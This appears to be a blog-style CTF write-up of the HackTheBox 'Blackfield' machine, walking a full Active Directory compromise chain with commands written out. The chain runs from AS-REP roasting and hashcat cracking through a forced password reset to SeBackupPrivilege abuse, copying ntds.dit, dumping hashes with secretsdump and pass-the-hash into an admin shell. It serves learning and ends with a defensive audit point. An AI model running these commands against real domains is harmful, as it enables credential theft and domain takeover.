---
title: 'HTB "Blackfield" — AS-REP Roasting to Backup Operator SeBackup'
date: '2026-05-30'
category: 'CTF'
difficulty: 'Hard'
featured: false
tags: ['htb', 'active-directory', 'as-rep-roast', 'sebackupprivilege']
excerpt: 'A clean AD chain: null-session user enumeration, AS-REP roasting, a forced password reset over SMB, and abusing SeBackupPrivilege to steal the DIT.'
---

Blackfield is a fantastic Windows box because every step maps to a real-world
AD misconfiguration. No memory corruption, no luck — just identity abuse.

## Recon

```bash
nmap -p- --min-rate 3000 10.10.10.192
# 53 88 135 139 389 445 593 3268 5985 ...  classic DC
```

## Foothold: null session -> AS-REP roast

The `profiles$` share is readable over a null session and leaks a wall of
usernames. Feed those to `GetNPUsers` and one account has Kerberos
pre-authentication disabled:

```bash
smbclient -N //10.10.10.192/profiles$ -c 'ls' | awk '{print $1}' > users.txt

GetNPUsers.py blackfield.local/ -no-pass -usersfile users.txt
# $krb5asrep$23$support@BLACKFIELD.LOCAL:...
```

Crack it offline:

```bash
hashcat -m 18200 support.hash rockyou.txt
# support:#00^BlackKnight
```

## Lateral: forced password reset

`support` holds `User-Force-Change-Password` over `audit2020`. No knowledge of
the current password required:

```bash
net rpc password 'audit2020' 'NewP@ss123!' -U 'blackfield.local/support%#00^BlackKnight' -S 10.10.10.192
```

## Privilege escalation: SeBackupPrivilege

`audit2020` is a **Backup Operator**. `SeBackupPrivilege` lets us read any file
on disk, bypassing DACLs — including a shadow copy of the `ntds.dit`.

```text
diskshadow /s script.txt      # snapshot C: to drive E:
robocopy /b E:\Windows\NTDS . ntds.dit
reg save HKLM\SYSTEM system.hive
```

Then extract every hash offline:

```bash
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
# Administrator:500:...:184f...:::
```

Pass-the-hash into a shell:

```bash
evil-winrm -i 10.10.10.192 -u Administrator -H 184f...
```

Root flag captured. The takeaway: `SeBackupPrivilege` is effectively domain
compromise on a Domain Controller. Audit who sits in Backup Operators as
carefully as you audit Domain Admins.
